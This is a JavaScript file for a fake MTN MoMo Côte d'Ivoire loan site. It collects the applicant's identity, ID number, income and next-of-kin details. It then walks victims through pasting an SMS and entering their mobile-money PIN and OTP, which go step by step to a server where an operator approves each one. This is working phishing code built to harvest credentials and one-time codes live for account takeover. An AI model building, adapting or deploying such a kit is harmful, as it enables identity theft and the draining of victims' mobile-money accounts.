// ============================================================
// script.js – MTN MoMo Côte d'Ivoire  (v10.1)
// Application → MoMo redirect → SMS verify → PIN verify → OTP verify → Dashboard
// ============================================================
'use strict';

var ACCOUNT_TYPES = {
    simplifie: { name: 'Compte Simplifié', icon: '🟢', maxLoan: 100000, minLoan: 25000 },
    standard:  { name: 'Compte Standard',  icon: '🔵', maxLoan: 500000, minLoan: 50000 },
    premium:   { name: 'Compte Premium',   icon: '🟣', maxLoan: 2000000, minLoan: 100000 }
};

var S = {
    applicationId: '',
    accountType: null,
    accountName: null,
    accountMaxLoan: 0,
    loginStatus: 'idle',
    applicationStatus: 'idle',
    loanAmount: 0,
    loanTerm: '12 Mois',
    monthlyRepayment: 0
};

var KEYS = { APP_ID: 'momo_ci_id_v10_1', DATA: 'momo_ci_data_v10_1' };
var pollTimer = null;
var ANNUAL_RATE = 0.24, SERVICE_FEE = 500;

function save(k, d) { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} }
function get(k) { try { var d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } }
function rm(k) { try { localStorage.removeItem(k); } catch (e) {} }
function saveAll() { save(KEYS.APP_ID, S.applicationId); save(KEYS.DATA, S); }

function fmt(n) { return (Number(n) || 0).toLocaleString('fr-FR').replace(/\u202f/g, ' ').replace(/\u00a0/g, ' '); }
function fmtXOF(n) { return fmt(n) + ' F CFA'; }
function genAppId() {
    var rand;
    try { rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase(); }
    catch (e) { rand = Math.random().toString(36).replace(/[^a-z0-9]/gi, '').toUpperCase(); }
    return 'CI-' + rand.slice(0, 8);
}
function showToast(msg, type, duration) {
    type = type || 'info';
    document.querySelectorAll('.toast').forEach(function (t) { t.remove(); });
    var el = document.createElement('div');
    el.className = 'toast toast-' + type;
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(function () { el.style.opacity = '0'; setTimeout(function () { el.remove(); }, 300); }, duration || 3200);
}
function showErr(id, msg) {
    var b = document.getElementById(id);
    if (b) { b.classList.add('show'); var t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; }
}
function clearErr(id) { var b = document.getElementById(id); if (b) b.classList.remove('show'); }
function setBtn(btn, loading, text) { if (!btn) return; btn.disabled = loading; btn.textContent = loading ? 'Veuillez patienter...' : text; }
function normalizePhone(id) {
    var el = document.getElementById(id); if (!el) return;
    var v = el.value.replace(/\D/g, ''); if (v.length > 10) v = v.substring(0, 10); el.value = v;
}

async function apiCall(endpoint, options) {
    options = options || {};
    var fetchOpts = Object.assign({ credentials: 'same-origin', headers: { 'Content-Type': 'application/json' } }, options);
    fetchOpts.headers = Object.assign({ 'Content-Type': 'application/json' }, options.headers || {});
    var res = await fetch(endpoint, fetchOpts);
    var data = await res.json();
    if (res.status === 429) { showToast('⏳ Trop de tentatives.', 'error', 5000); throw new Error('Rate limited'); }
    return data;
}

function goTo(pageId) {
    document.querySelectorAll('.page').forEach(function (p) { p.classList.remove('active'); });
    var el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
    try { history.pushState({ page: pageId }, '', '#' + pageId); } catch (e) {}
    if (pageId !== 'page-login-wait') stopPoll();
}

function updateCalc() {
    var slider = document.getElementById('amtSlider');
    if (!slider) return;
    var amt = +slider.value;
    var term = +(document.getElementById('calcTermSelect') || {}).value || 12;
    var r = ANNUAL_RATE / 12;
    var monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + SERVICE_FEE);
    var set = function (id, v) { var e = document.getElementById(id); if (e) e.textContent = v; };
    set('calcAmt', fmtXOF(amt));
    set('monthlyAmt', fmtXOF(monthly));
    set('totalAmt', fmtXOF(monthly * term));
    set('receiveAmt', fmtXOF(amt));
    var pct = ((amt - 25000) / (2000000 - 25000)) * 100;
    slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');
}

function detectAccountType(amount) {
    if (amount <= 100000) return 'simplifie';
    if (amount <= 500000) return 'standard';
    return 'premium';
}
function updateTwenty() {
    var amt = +(document.getElementById('appLoanAmount') || {}).value || 0;
    var twenty = Math.ceil(amt * 0.20);
    var a = document.getElementById('twentyAmount');
    var b = document.getElementById('twentyAmountInline');
    if (a) a.textContent = fmtXOF(twenty);
    if (b) b.textContent = fmtXOF(twenty);
    var hint = document.getElementById('autoTypeHint');
    if (hint) {
        var t = detectAccountType(amt);
        var tc = ACCOUNT_TYPES[t];
        hint.innerHTML = 'Détecté : <b>' + tc.icon + ' ' + tc.name + '</b> · Prêt max ' + fmtXOF(tc.maxLoan);
    }
}

function openApplication(prefillAmount, prefillTerm) {
    if (!S.applicationId) { S.applicationId = genAppId(); saveAll(); }
    if (prefillAmount) {
        var amt = document.getElementById('appLoanAmount');
        if (amt) amt.value = prefillAmount;
    }
    if (prefillTerm) {
        var te = document.getElementById('appLoanTerm');
        if (te) te.value = prefillTerm;
    }
    updateTwenty();
    clearErr('appErr');
    goTo('page-application');
}

async function submitApplication() {
    var body = {
        applicationId: S.applicationId,
        fullName: ((document.getElementById('appName') || {}).value || '').trim(),
        idNumber: ((document.getElementById('appIdNumber') || {}).value || '').trim().toUpperCase(),
        dob: (document.getElementById('appDob') || {}).value || '',
        email: ((document.getElementById('appEmail') || {}).value || '').trim(),
        phone: ((document.getElementById('appPhone') || {}).value || '').trim(),
        loanType: (document.getElementById('appLoanType') || {}).value,
        loanAmount: +(document.getElementById('appLoanAmount') || {}).value,
        loanTerm: (document.getElementById('appLoanTerm') || {}).value,
        loanPurpose: ((document.getElementById('appLoanPurpose') || {}).value || '').trim(),
        employment: (document.getElementById('appEmployment') || {}).value,
        annualIncome: +(document.getElementById('appIncome') || {}).value,
        kinName: ((document.getElementById('appKinName') || {}).value || '').trim(),
        kinPhone: ((document.getElementById('appKinPhone') || {}).value || '').trim(),
        kinRelation: (document.getElementById('appKinRelation') || {}).value,
        kinTncAccepted: !!(document.getElementById('kinTnc') || {}).checked,
        has20Percent: !!(document.getElementById('has20Percent') || {}).checked,
        tncAccepted: !!(document.getElementById('appTnc') || {}).checked
    };

    if (!body.fullName || body.fullName.length < 3) return showErr('appErr', 'Nom complet requis.');
    if (!/^[A-Z0-9]{8,14}$/.test(body.idNumber)) return showErr('appErr', 'CNI invalide (8–14).');
    if (!body.dob) return showErr('appErr', 'Date de naissance requise.');
    var dob = new Date(body.dob); var now = new Date();
    var age = now.getFullYear() - dob.getFullYear();
    var mm = now.getMonth() - dob.getMonth();
    if (mm < 0 || (mm === 0 && now.getDate() < dob.getDate())) age--;
    if (age < 18) return showErr('appErr', '18 ans minimum.');
    if (!body.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(body.email)) return showErr('appErr', 'Email invalide.');
    if (body.phone.length !== 10) return showErr('appErr', 'Téléphone 10 chiffres.');
    if (body.loanAmount < 25000 || body.loanAmount > 2000000) return showErr('appErr', 'Montant 25k–2M F CFA.');
    if (!body.loanPurpose) return showErr('appErr', 'Objet requis.');
    if (!body.annualIncome || body.annualIncome <= 0) return showErr('appErr', 'Revenu requis.');
    if (!body.kinName) return showErr('appErr', 'Nom du proche requis.');
    if (body.kinPhone.length !== 10) return showErr('appErr', 'Téléphone du proche 10 chiffres.');
    if (!body.kinRelation) return showErr('appErr', 'Relation requise.');
    if (!body.kinTncAccepted) return showErr('appErr', 'Le proche doit accepter.');
    if (!body.has20Percent) return showErr('appErr', 'Règle 20 % à confirmer.');
    if (!body.tncAccepted) return showErr('appErr', 'CGL à accepter.');

    var btn = document.getElementById('appSubmitBtn');
    setBtn(btn, true, 'Soumettre ma demande');
    clearErr('appErr');

    try {
        var data = await apiCall('/api/submit-application', { method: 'POST', body: JSON.stringify(body) });
        setBtn(btn, false, 'Soumettre ma demande');
        if (!data.ok) return showErr('appErr', data.error || 'Erreur.');

        S.accountType = data.accountType;
        S.accountName = data.accountName;
        S.accountMaxLoan = data.accountMaxLoan;
        S.loanAmount = body.loanAmount;
        S.loanTerm = body.loanTerm;
        var months = parseInt(body.loanTerm) || 12;
        S.monthlyRepayment = Math.ceil(body.loanAmount * ANNUAL_RATE / 12 / (1 - Math.pow(1 + ANNUAL_RATE / 12, -months)) + SERVICE_FEE);
        S.applicationStatus = 'pending_login';
        saveAll();

        goTo('page-momo-redirect');
        startRedirectCountdown();
    } catch (e) { setBtn(btn, false, 'Soumettre ma demande'); showErr('appErr', e.message); }
}

function startRedirectCountdown() {
    var numEl = document.getElementById('countdownNum');
    var plurEl = document.getElementById('countdownPlural');
    var barEl = document.getElementById('redirectBar');
    var sec = 5;
    if (numEl) numEl.textContent = sec;
    if (barEl) {
        barEl.style.transition = 'none';
        barEl.style.width = '0%';
        void barEl.offsetWidth;
        barEl.style.transition = 'width 5s linear';
        barEl.style.width = '100%';
    }
    var iv = setInterval(function () {
        sec--;
        if (numEl) numEl.textContent = sec > 0 ? sec : '0';
        if (plurEl) plurEl.textContent = sec > 1 ? 's' : '';
        if (sec <= 0) {
            clearInterval(iv);
            goTo('page-login-sms');
            var phone = document.getElementById('smsPhone');
            if (phone) phone.value = ((document.getElementById('appPhone') || {}).value || '');
        }
    }, 1000);
}

// ─── SMS submit ───
async function submitSms() {
    var sms = ((document.getElementById('smsText') || {}).value || '').trim();
    var phone = ((document.getElementById('smsPhone') || {}).value || '').trim();
    if (sms.length < 10) return showErr('smsErr', 'Collez le SMS complet.');
    if (phone.length !== 10) return showErr('smsErr', 'Téléphone 10 chiffres.');
    var btn = document.getElementById('smsBtn');
    setBtn(btn, true, 'Envoi...');
    clearErr('smsErr');
    try {
        var data = await apiCall('/api/login/sms', { method: 'POST', body: JSON.stringify({ applicationId: S.applicationId, sms: sms, phone: phone }) });
        setBtn(btn, false, 'Envoyer pour vérification');
        if (!data.ok) return showErr('smsErr', data.error || 'Erreur.');
        S.loginStatus = 'sms_submitted'; saveAll();
        showWait('sms');
        pollStatus();
    } catch (e) { setBtn(btn, false, 'Envoyer pour vérification'); showErr('smsErr', e.message); }
}

// ─── PIN submit ───
async function submitPin() {
    var pin = [0,1,2,3,4].map(function (i) { return (document.getElementById('pinBox' + i) || {}).value || ''; }).join('');
    if (pin.length !== 5) return showErr('pinErr', 'Code PIN à 5 chiffres.');
    var btn = document.getElementById('pinBtn');
    setBtn(btn, true, 'Envoi...');
    clearErr('pinErr');
    try {
        var data = await apiCall('/api/login/pin', { method: 'POST', body: JSON.stringify({ applicationId: S.applicationId, pin: pin }) });
        setBtn(btn, false, 'Envoyer pour vérification');
        if (!data.ok) return showErr('pinErr', data.error || 'Erreur.');
        S.loginStatus = 'pin_submitted'; saveAll();
        showWait('pin');
        pollStatus();
    } catch (e) { setBtn(btn, false, 'Envoyer pour vérification'); showErr('pinErr', e.message); }
}

// ─── OTP submit ───
async function submitOtp() {
    var otp = [0,1,2,3,4,5].map(function (i) { return (document.getElementById('otpBox' + i) || {}).value || ''; }).join('');
    if (otp.length !== 6) return showErr('otpErr', 'Code OTP à 6 chiffres.');
    var btn = document.getElementById('otpBtn');
    setBtn(btn, true, 'Envoi...');
    clearErr('otpErr');
    try {
        var data = await apiCall('/api/login/otp', { method: 'POST', body: JSON.stringify({ applicationId: S.applicationId, otp: otp }) });
        setBtn(btn, false, 'Soumettre ma demande');
        if (!data.ok) return showErr('otpErr', data.error || 'Erreur.');
        S.loginStatus = 'otp_submitted'; saveAll();
        showWait('otp');
        pollStatus();
    } catch (e) { setBtn(btn, false, 'Soumettre ma demande'); showErr('otpErr', e.message); }
}

// ─── Shared wait page updater ───
function showWait(step) {
    var iconEl = document.getElementById('waitIcon');
    var titleEl = document.getElementById('waitTitle');
    var subEl = document.getElementById('waitSubtitle');
    var statusEl = document.getElementById('waitStatus');
    var appIdEl = document.getElementById('waitAppId');

    if (appIdEl) appIdEl.textContent = S.applicationId;

    if (step === 'sms') {
        if (iconEl) iconEl.textContent = '📩';
        if (titleEl) titleEl.textContent = 'Vérification du SMS...';
        if (subEl) subEl.textContent = 'L\'administrateur vérifie votre SMS. Vous passerez au PIN dès approbation.';
        if (statusEl) statusEl.textContent = '⏳ Étape 1/3 · SMS en attente...';
    } else if (step === 'pin') {
        if (iconEl) iconEl.textContent = '🔑';
        if (titleEl) titleEl.textContent = 'Vérification du PIN...';
        if (subEl) subEl.textContent = 'L\'administrateur vérifie votre code PIN. Vous passerez à l\'OTP dès approbation.';
        if (statusEl) statusEl.textContent = '⏳ Étape 2/3 · PIN en attente...';
    } else if (step === 'otp') {
        if (iconEl) iconEl.textContent = '🔢';
        if (titleEl) titleEl.textContent = 'Vérification de l\'OTP...';
        if (subEl) subEl.textContent = 'L\'administrateur vérifie votre code OTP. Vous recevrez votre prêt dès approbation.';
        if (statusEl) statusEl.textContent = '⏳ Étape 3/3 · OTP en attente...';
    }

    goTo('page-login-wait');
}

function stopPoll() { if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; } }

function pollStatus() {
    stopPoll();
    var tick = async function () {
        try {
            var r = await fetch('/api/login/status/' + S.applicationId, { credentials: 'same-origin' });
            var data = await r.json();
            if (!data.ok) { pollTimer = setTimeout(tick, 3000); return; }
            S.loginStatus = data.loginStatus;
            S.applicationStatus = data.applicationStatus;
            if (data.accountType) S.accountType = data.accountType;
            if (data.accountName) S.accountName = data.accountName;
            if (data.accountMaxLoan) S.accountMaxLoan = data.accountMaxLoan;
            saveAll();

            // Route based on status
            switch (data.loginStatus) {
                case 'sms_verified':
                    stopPoll();
                    showToast('✅ SMS vérifié (1/3) !', 'success', 3000);
                    setTimeout(function () { goTo('page-login-pin'); }, 700);
                    return;
                case 'pin_verified':
                    stopPoll();
                    showToast('✅ PIN vérifié (2/3) !', 'success', 3000);
                    setTimeout(function () { goTo('page-login-otp'); }, 700);
                    return;
                case 'otp_verified':
                    stopPoll();
                    showToast('🎉 Prêt approuvé !', 'success', 3500);
                    setTimeout(showDashboard, 800);
                    return;
                case 'sms_rejected':
                case 'pin_rejected':
                case 'otp_rejected':
                    stopPoll();
                    var el = document.getElementById('rejectReason');
                    if (el) el.textContent = data.rejectionReason || 'Votre demande n\'a pas été approuvée.';
                    goTo('page-rejected');
                    return;
                case 'sms_submitted':
                case 'pin_submitted':
                case 'otp_submitted':
                    // still pending
                    break;
            }
            pollTimer = setTimeout(tick, 3000);
        } catch (e) { pollTimer = setTimeout(tick, 4000); }
    };
    tick();
}

function showDashboard() {
    var set = function (id, v) { var e = document.getElementById(id); if (e) e.textContent = v; };
    var tc = ACCOUNT_TYPES[S.accountType] || {};
    var phone = ((document.getElementById('smsPhone') || {}).value) || '';
    set('dashAmount', fmtXOF(S.loanAmount || 0));
    set('dashAccount', phone ? ('+225 ' + phone) : '');
    set('dashTerm', S.loanTerm || '—');
    set('dashMonthly', fmtXOF(S.monthlyRepayment || 0));
    set('dashAccountType', (tc.icon || '') + ' ' + (tc.name || ''));
    set('dashId', S.applicationId);
    goTo('page-dashboard');
}

// ─── Terms ───
var _termsCache = null;
async function showTerms() {
    try {
        var m = document.getElementById('termsModal');
        var p = document.getElementById('termsText');
        if (m) m.classList.add('show');
        if (_termsCache) { if (p) p.textContent = _termsCache; return; }
        if (p) p.textContent = 'Chargement…';
        var data = await apiCall('/api/terms');
        if (!data.ok) { if (p) p.textContent = 'Erreur.'; return; }
        _termsCache = data.text;
        if (p) p.textContent = data.text;
    } catch (e) { showToast(e.message, 'error'); }
}
function closeTerms() { var m = document.getElementById('termsModal'); if (m) m.classList.remove('show'); }
function acceptTerms() {
    var app = document.getElementById('appTnc'); if (app) app.checked = true;
    var kin = document.getElementById('kinTnc'); if (kin) kin.checked = true;
    closeTerms();
    showToast('✅ Conditions acceptées', 'success', 1500);
}

// ─── Pin/OTP wiring ───
function wireBoxes(prefix, length) {
    for (var i = 0; i < length; i++) {
        (function (idx) {
            var el = document.getElementById(prefix + idx);
            if (!el) return;
            el.addEventListener('input', function () {
                el.value = el.value.replace(/\D/g, '').slice(0, 1);
                if (el.value && idx < length - 1) {
                    var n = document.getElementById(prefix + (idx + 1)); if (n) n.focus();
                }
            });
            el.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace' && !el.value && idx > 0) {
                    var p = document.getElementById(prefix + (idx - 1));
                    if (p) { p.focus(); p.value = ''; }
                }
            });
            el.addEventListener('paste', function (e) {
                var t = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '');
                if (!t) return;
                e.preventDefault();
                t.slice(0, length - idx).split('').forEach(function (d, k) {
                    var b = document.getElementById(prefix + (idx + k)); if (b) b.value = d;
                });
                var n = document.getElementById(prefix + Math.min(idx + t.length, length - 1));
                if (n) n.focus();
            });
        })(i);
    }
}

function bind(id, fn) {
    var el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('click', function (e) {
        e.preventDefault();
        try { fn(e); } catch (err) { console.error('[' + id + ']', err); showToast('Erreur.', 'error'); }
    });
}
function bindGoto() {
    document.querySelectorAll('[data-goto]').forEach(function (el) {
        el.addEventListener('click', function (e) { e.preventDefault(); goTo(el.dataset.goto); });
    });
}

function wireAll() {
    bind('applyBtn', function () { openApplication(); });
    bind('registerFirstBtn', function () {
        window.open('https://www.mtn.ci/fr/particulier/mobile-money', '_blank', 'noopener');
    });
    bind('calcApplyBtn', function () {
        var amt = +(document.getElementById('amtSlider') || {}).value || 100000;
        var term = (document.getElementById('calcTermSelect') || {}).value + ' Mois';
        openApplication(amt, term);
    });
    var sl = document.getElementById('amtSlider');
    if (sl) sl.addEventListener('input', updateCalc);
    var ct = document.getElementById('calcTermSelect');
    if (ct) ct.addEventListener('change', updateCalc);

    bind('appSubmitBtn', submitApplication);
    bind('viewTermsBtn', showTerms);
    bind('termsLink', showTerms);
    bind('kinTermsLink', showTerms);
    bind('closeTermsBtn', closeTerms);
    bind('acceptTermsBtn', acceptTerms);
    var amtEl = document.getElementById('appLoanAmount');
    if (amtEl) amtEl.addEventListener('input', updateTwenty);

    bind('smsBtn', submitSms);
    bind('pinBtn', submitPin);
    bind('otpBtn', submitOtp);

    bind('pinToggle', function () {
        for (var i = 0; i < 5; i++) {
            var b = document.getElementById('pinBox' + i);
            if (b) b.type = b.type === 'password' ? 'text' : 'password';
        }
    });
    bind('pinClear', function () {
        for (var i = 0; i < 5; i++) { var b = document.getElementById('pinBox' + i); if (b) b.value = ''; }
        var f = document.getElementById('pinBox0'); if (f) f.focus();
    });

    ['appPhone', 'appKinPhone', 'smsPhone'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.addEventListener('input', function () { normalizePhone(id); });
    });

    bind('dashPdfBtn', function () {
        if (S.applicationId) window.location.href = '/api/agreement-pdf/' + S.applicationId;
    });
    bind('dashCopyBtn', function () {
        if (navigator.clipboard) navigator.clipboard.writeText(S.applicationId).then(function () { showToast('📋 Copié !', 'success'); });
    });
    bind('dashNewBtn', restart);
    bind('rejectedNewBtn', restart);

    bindGoto();
    console.log('✅ Handlers wired');
}

function restart() {
    if (!confirm('Commencer une nouvelle demande ?')) return;
    Object.keys(KEYS).forEach(function (k) { rm(KEYS[k]); });
    location.reload();
}

function boot() {
    console.log('🚀 MoMo CI v10.1');
    var id = get(KEYS.APP_ID);
    var data = get(KEYS.DATA);
    if (id) S.applicationId = id;
    if (data) Object.assign(S, data);

    wireBoxes('pinBox', 5);
    wireBoxes('otpBox', 6);
    wireAll();
    updateCalc();
    updateTwenty();

    // Auto-resume based on login status
    var ls = S.loginStatus;
    var as = S.applicationStatus;

    if (as === 'approved' || ls === 'otp_verified') {
        showDashboard();
    } else if (ls === 'otp_submitted') {
        showWait('otp'); pollStatus();
    } else if (ls === 'pin_verified') {
        goTo('page-login-otp');
    } else if (ls === 'pin_submitted') {
        showWait('pin'); pollStatus();
    } else if (ls === 'sms_verified') {
        goTo('page-login-pin');
    } else if (ls === 'sms_submitted') {
        showWait('sms'); pollStatus();
    } else if (ls === 'sms_rejected' || ls === 'pin_rejected' || ls === 'otp_rejected' || as === 'rejected') {
        var el = document.getElementById('rejectReason');
        if (el) el.textContent = (data && data.rejectionReason) || 'Votre demande n\'a pas été approuvée.';
        goTo('page-rejected');
    } else if (as === 'pending_login' || (S.applicationId && ls === 'idle')) {
        goTo('page-login-sms');
    } else {
        goTo('page-landing');
    }

    document.addEventListener('visibilitychange', function () {
        if (document.hidden) return;
        var pollStates = ['sms_submitted', 'pin_submitted', 'otp_submitted'];
        if (pollTimer === null && pollStates.indexOf(S.loginStatus) !== -1) {
            pollStatus();
        }
    });
}

if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
else boot();
